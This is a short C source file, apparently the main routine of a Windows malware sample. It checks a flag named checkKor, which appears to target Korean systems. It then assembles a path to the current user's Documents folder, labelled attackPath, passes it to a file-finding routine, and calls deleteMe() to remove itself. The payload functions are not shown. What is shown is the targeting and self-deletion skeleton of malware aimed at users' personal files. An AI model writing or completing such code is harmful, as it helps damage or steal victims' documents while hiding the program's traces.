#include "main.h"

int main()
{
	if (checkKor) {
		char attackPath[MAX_PATH] = "C:\\Users\\";
		
		char szUserName[100];
		unsigned long dwLength = 100;

		GetUserName(szUserName, &dwLength);

		strncat_s(attackPath, szUserName, MAX_PATH);
		strncat_s(attackPath, "\\Documents\\", MAX_PATH);
	
		find_files(attackPath);
	}

	deleteMe();
	return 0;
}